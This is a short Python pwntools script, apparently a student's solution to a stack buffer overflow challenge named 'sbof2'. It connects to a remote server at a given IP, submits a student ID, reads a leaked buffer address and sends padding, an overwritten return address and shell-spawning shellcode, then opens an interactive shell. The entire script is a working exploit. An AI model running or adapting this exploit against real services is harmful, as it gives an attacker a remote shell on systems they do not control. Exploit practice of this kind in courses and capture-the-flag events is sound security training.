from pwn import *

context.log_level = 'DEBUG' # set debug logging
context.arch = "amd64"

# p = process("./sbof2")

p = remote("8.154.20.109", 10100)
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(b"3220103544")
p.recvuntil(b"gift address: ")
buffer_address = int(p.recvline().strip(), 16)

payload = b""
payload += b"a" * 0x108
payload += p64(buffer_address+0x110)
payload += asm(shellcraft.sh())


p.sendline(payload)
p.interactive()
